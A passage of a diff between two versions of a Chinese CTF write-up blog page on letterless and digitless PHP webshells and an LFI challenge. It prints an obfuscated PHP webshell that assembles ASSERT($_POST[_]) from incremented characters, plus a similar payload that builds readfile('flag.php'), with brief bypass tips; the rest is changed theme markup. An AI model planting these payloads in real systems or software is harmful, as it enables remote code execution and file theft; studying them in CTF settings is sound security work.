//$__=A<br><br>$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; //$__='S'<br><br>$___.=$__; //  $___='AS'<br><br>$___.=$__; //  $___='ASS'<br><br>$__=$_;  // $__='A'<br><br>$__++;$__++;$__++;$__++; // $__='E'<br><br>$___.=$__; //$___='ASSE'<br><br>$__=$_;  //$__='A'<br><br>$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // $__='R'<br><br>$___.=$__;  //$___='ASSER'<br><br>$__=$_;  //$__='A'<br><br>$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // $__='T'<br><br>$___.=$__; //$___='ASSERT'<br><br> <br><br>$____='_';  //$____='_'<br><br>$__=$_; //$__='A'<br><br>$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // $__='P'  <br><br>$____.=$__; //$____='_P'<br><br>$__=$_; //$__='A'<br><br>$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // $__='O'<br><br>$____.=$__; //$____='_PO'<br><br>$__=$_; //$__='A'<br><br>$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // $__='S'<br><br>$____.=$__; //$____='_POS'<br><br>$__=$_; //$__='A'<br><br>$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // $__='T'<br><br>$____.=$__; ////$____='_POST'<br><br> <br><br>$_=$$____; //$_='$_POST'<br><br>$___($_[_]); // ASSERT($_POST[_]);<br><br>?><br></code></pre></td></tr></tbody></table></figure>
+<pre><code>&lt;?php
+
+$_=[];
+
+$_=@&quot;$_&quot;; // $_=&#39;Array&#39;;
+
+$_=$_[&#39;!&#39;==&#39;@&#39;]; // $_=$_[0];
+
+$___=$_; // A
+
+$__=$_; //$__=A
+
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; //$__=&#39;S&#39;
+
+$___.=$__; //  $___=&#39;AS&#39;
+
+$___.=$__; //  $___=&#39;ASS&#39;
+
+$__=$_;  // $__=&#39;A&#39;
+
+$__++;$__++;$__++;$__++; // $__=&#39;E&#39;
+
+$___.=$__; //$___=&#39;ASSE&#39;
+
+$__=$_;  //$__=&#39;A&#39;
+
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // $__=&#39;R&#39;
+
+$___.=$__;  //$___=&#39;ASSER&#39;
+
+$__=$_;  //$__=&#39;A&#39;
+
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // $__=&#39;T&#39;
+
+$___.=$__; //$___=&#39;ASSERT&#39;
 
 
 
-<p>再构造readfile(‘flag.php’)</p>
-<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain"><?=$_=[];$_="$_";$_=$_[("!"=="!")+("!"=="!")+("!"=="!")];$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___=$_;$___++;$___++;$___++;$___++;$____=$_;$_____=$_;$_____++;$_____++;$_____++;$______=$_;$______++;$______++;$______++;$______++;$______++;$__=$__.$___.$____.$_____.$______;$___=$_;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$____=$_;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$_____=$_;$_____++;$_____++;$_____++;$_____++;$__=$__.$___.$____.$_____;$___=$_;$___++;$___++;$___++;$___++;$___++;$____=$_;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$_____=$_;$______=$_;$______++;$______++;$______++;$______++;$______++;$______++;$___=$___.$____.$_____.$______;$____=$_;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$_____=$_;$_____++;$_____++;$_____++;$_____++;$_____++;$_____++;$_____++;$___=$___.'.'.$____.$_____.$____;$__($___);?><br></code></pre></td></tr></tbody></table></figure>
+$____=&#39;_&#39;;  //$____=&#39;_&#39;
+
+$__=$_; //$__=&#39;A&#39;
+
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // $__=&#39;P&#39;  
+
+$____.=$__; //$____=&#39;_P&#39;
+
+$__=$_; //$__=&#39;A&#39;
+
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // $__=&#39;O&#39;
+
+$____.=$__; //$____=&#39;_PO&#39;
+
+$__=$_; //$__=&#39;A&#39;
+
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // $__=&#39;S&#39;
+
+$____.=$__; //$____=&#39;_POS&#39;
+
+$__=$_; //$__=&#39;A&#39;
+
+$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // $__=&#39;T&#39;
+
+$____.=$__; ////$____=&#39;_POST&#39;
 
 
 
-<p>然后记得url编码过去 + 在匹配中会认为是空格</p>
-<p><a href="/CTF/2/16.png" data-caption="1" data-fancybox="images"><img src="/CTF/2/16.png" alt="1"></a></p>
+$_=$$____; //$_=&#39;$_POST&#39;
+
+$___($_[_]); // ASSERT($_POST[_]);
+
+?&gt;</code></pre><p>再构造readfile(‘flag.php’)</p>
+<pre><code>&lt;?=$_=[];$_=&quot;$_&quot;;$_=$_[(&quot;!&quot;==&quot;!&quot;)+(&quot;!&quot;==&quot;!&quot;)+(&quot;!&quot;==&quot;!&quot;)];$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___=$_;$___++;$___++;$___++;$___++;$____=$_;$_____=$_;$_____++;$_____++;$_____++;$______=$_;$______++;$______++;$______++;$______++;$______++;$__=$__.$___.$____.$_____.$______;$___=$_;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$____=$_;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$_____=$_;$_____++;$_____++;$_____++;$_____++;$__=$__.$___.$____.$_____;$___=$_;$___++;$___++;$___++;$___++;$___++;$____=$_;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$_____=$_;$______=$_;$______++;$______++;$______++;$______++;$______++;$______++;$___=$___.$____.$_____.$______;$____=$_;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$_____=$_;$_____++;$_____++;$_____++;$_____++;$_____++;$_____++;$_____++;$___=$___.&#39;.&#39;.$____.$_____.$____;$__($___);?&gt;</code></pre><p>然后记得url编码过去 + 在匹配中会认为是空格</p>
+<p><img src="/CTF/2/16.png" alt="1"></p>
 <p>然后包含</p>
-<p> <a href="/CTF/2/17.png" data-caption="1" data-fancybox="images"><img src="/CTF/2/17.png" alt="1"></a></p>
+<p> <img src="/CTF/2/17.png" alt="1"></p>
 <p>再补充下为什么文件后缀不是 php 可以执行 php代码  只要文件内容是php完整代码就能执行</p>
-<p> <a href="/CTF/2/18.png" data-caption="1" data-fancybox="images"><img src="/CTF/2/18.png" alt="1"></a></p>
-</body></html>
+<p> <img src="/CTF/2/18.png" alt="1"></p>
 
-  
-  <div class="post-guide">
-    <div class="item left">
-        
+      
     </div>
-    <div class="item right">
-        
-          <a href="/CTF/1/">哈希长度扩展攻击</a>
-        
-    </div>
-  </div>
-
-  
-
-  <div class="post-copyright">
-    <div class="auth">
-      本文作者：<a href="http://perthinking.xyz">1eng</a>
-    </div>
-    <div class="link">
-      永久链接：<a href="http://perthinking.xyz/CTF/2/">http://perthinking.xyz/CTF/2/</a>
-    </div>
-    <div class="declare">
-      版权声明：本文首发于<a href="http://perthinking.xyz">1eng</a>的博客，转载请注明出处！
-    </div>
-  </div>
-
-  <div id="comment"></div>
-
-  
-  
-</article>
-        <footer>
-          <div class="copyright">
-            ©2020
-            <a href="http://perthinking.xyz">1eng</a> Powered by <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> |
-            <a href="https://github.com/shixiaohu2206/hexo-theme-huhu" target="_blank" rel="noopener">hexo-theme-huhu</a>
-          </div>
-          
-        </footer>
-      </div>
-    </div>
-  </body>
-  
-</html>
-<script type="text/javascript">
-                  window.HUHU_CONFIG = JSON.parse("{\"share\":[\"weibo\",\"weixin\",\"qqkongjian\",\"QQ\",\"douban\",\"facebook\",\"twitter\",\"google\"],\"valine\":{\"API_ID\":\"\",\"API_KEY\":\"\"},\"service_worker\":{\"open\":false}}")
-                </script> <script type="text/javascript">window.addEventListener('load', function() {
+    <div class="article-footer">
+      <blockquote class="mt-2x">
+  <ul class="post-copyright list-unstyled">
     
-    window.loadJs = function(d, m, a) {
-      var c = document.getElementsByTagName('head')[0] || document.head || document.documentElement
-      var b = document.createElement('script')
-      b.defer = true
-      b.setAttribute('type', 'text/javascript')
-      b.setAttribute('charset', 'UTF-8')
-      b.setAttribute('async', 'true')
-      b.setAttribute('src', d)
-      m && b.setAttribute('data-main', '/scripts/app-built')
-      if (typeof a === 'function') {
-        if (window.attachEvent) {
-          b.onreadystatechange = function() {
-            var e = b.readyState
-            if (e === 'loaded' || e === 'complete') {
-              b.onreadystatechange = null
-              a()
-            }
-          }
-        } else {
-          b.onload = a
-        }
-      }
-      c.appendChild(b)
-    }
-    window.loadJs && window.loadJs('https://cdn.bootcss.com/require.js/2.3.6/require.min.js', true, function() {require.config({"paths":{"util":"util","share":"share","search":"search","pagemap":"pagemap.min","registerSW":"registerSW","valine":"cdn/Valine.min","av":["https://cdn.jsdelivr.net/npm/leancloud-storage/dist/av-min"],"pjax":["https://cdn.bootcss.com/jquery.pjax/2.0.1/jquery.pjax.min"],"jquery":["https://cdn.bootcss.com/jquery/3.4.1/jquery.min"],"confirm":["https://cdn.bootcss.com/jquery-confirm/3.3.4/jquery-confirm.min"],"fancybox":["https://cdn.bootcss.com/fancybox/3.5.7/jquery.fancybox.min"],"chart":["https://cdn.bootcss.com/Chart.js/2.8.0-rc.1/Chart.bundle.min"]},"map":{"*":{"css":"https://cdn.bootcss.com/require-css/0.1.10/css.min.js"}},"shim":{"fancybox":{"deps":["css!https://cdn.bootcss.com/fancybox/3.5.7/jquery.fancybox.min.css"]},"confirm":{"deps":["css!https://cdn.bootcss.com/jquery-confirm/3.3.4/jquery-confirm.min.css"]},"chart":{"deps":["css!https://cdn.bootcss.com/Chart.js/2.8.0-rc.1/Chart.min.css"]}},"waitSeconds":3})})
-  })</script> <script type="text/javascript">
-                  ;(function() {
-                    var bp = document.createElement('script')
-                    var curProtocol = window.location.protocol.split(':')[0]
-                    if (curProtocol === 'https') {
-                      bp.src = 'https://zz.bdstatic.com/linksubmit/push.js'
-                    } else {
-                      bp.src = 'http://push.zhanzhang.baidu.com/push.js'
-                    }
-                    var s = document.getElementsByTagName('script')[0]
-                    s.parentNode.insertBefore(bp, s)
-                  })()
-                </script> 
+    <li class="post-copyright-link hidden-xs">
+      <strong>本文链接：</strong>
+      <a href="http://perthinking.xyz/CTF/2/" title="代码审计+无数字字母webshell+windowsFindFirstfile利用+xctf-finals Web-lfi2019" target="_blank" rel="external">http://perthinking.xyz/CTF/2/</a>
+    </li>
+    
+    <li class="post-copyright-license">
+      <strong>版权声明： </strong> 本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN协议</a> 许可协议。转载请注明出处！
+    </li>
+  </ul>
+</blockquote>
+
+
+<div class="panel panel-default panel-badger">
+  <div class="panel-body">
+    <figure class="media">
+      <div class="media-left">
+        <a href="https://github.com/1eng" target="_blank" class="img-burn thumb-sm visible-lg">
+          <img src="/images/avatar.jpg" class="img-rounded w-full" alt="">
+        </a>
+      </div>
+      <div class="media-body">
+        <h3 class="media-heading"><a href="https://github.com/1eng" target="_blank"><span class="text-dark">1eng</span><small class="ml-1x">Information Security &amp; Student</small></a></h3>
+        <div>菜鸡一枚,哪位大佬收了我当挂件|···|</div>
+      </div>
+    </figure>
+  </div>
+</div>
+
+
+    </div>
+  </article>
+  
+    
+  <section id="comments">
+  	
+      <div id="vcomments"></div>
+    
+  </section>
+
+
+  
+</div>
+
+  <nav class="bar bar-footer clearfix" data-stick-bottom>
+  <div class="bar-inner">
+  
+  <ul class="pager pull-left">
+    
+    <li class="prev">
+      <a href="/HTB%E9%9D%B6%E6%9C%BA/1/" title="HTB靶机练习-Control"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;上一篇</span></a>
+    </li>
+    
+    
+    <li class="next">
+      <a href="/CTF/1/" title="哈希长度扩展攻击"><span>下一篇&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
+    </li>
+    
+    
+    <li class="toggle-toc">
+      <a class="toggle-btn collapsed" data-toggle="collapse" href="#collapseToc" aria-expanded="false" title="文章目录" role="button">
+        <span>[&nbsp;</span><span>文章目录</span>
+        <i class="text-collapsed icon icon-anchor"></i>
+        <i class="text-in icon icon-close"></i>
+        <span>]</span>
+      </a>
+    </li>
+    
+  </ul>
+  
+  
+  
+  <div class="bar-right">
+    
+    <div class="share-component" data-sites="weibo,qq,wechat,facebook,twitter" data-mobile-sites="weibo,qq,qzone"></div>
+    
+  </div>
+  </div>
+</nav>
+  
+
+
+</main>
+
+  <footer class="footer" itemscope itemtype="http://schema.org/WPFooter">
+	
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/1eng" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="https://twitter.com/markwhile1" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="icon icon-twitter"></i></a></li>
+        
+    </ul>
+
+    <div class="copyright">
+    	
+        <div class="publishby">
+        	Theme by <a href="https://github.com/cofess" target="_blank"> cofess </a>base on <a href="https://github.com/cofess/hexo-theme-pure" target="_blank">pure</a>.
+        </div>
+    </div>
+</footer>
+  <script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script>
+<script>
+window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
+</script>
+
+<script src="/js/plugin.min.js"></script>
+
+
+<script src="/js/application.js"></script>
+
+
+    <script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: '文章',
+            PAGES: '页面',
+            CATEGORIES: '分类',
+            TAGS: '标签',
+            UNTITLED: '(未命名)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+
+<script src="/js/insight.js"></script>
+
+
+
+
+
+
+   
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+   
+    
+  <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/valine"></script>
+  <script type="text/javascript">
+  var GUEST = ['nick', 'mail', 'link'];
+  var meta = 'nick,mail,link';
+  meta = meta.split(',').filter(function(item) {
+    return GUEST.indexOf(item) > -1;
+  });
+  new Valine({
+    el: '#vcomments',
+    verify: false,
+    notify: false,
+    appId: 'O0twhlXmhDaIrHEXxY8FBeB1-gzGzoHsz',
+    appKey: 'pIcHWaOiHXkAi1fMo3UsumkV',
+    placeholder: 'Ask your question, let&#39;s solve it together',
+    avatar: 'mm',
+    meta: meta,
+    pageSize: '10' || 10,
+    visitor: false
+  });
+  </script>
+
+     
+
+
+
+
+
+
+
+</body>
+</html>
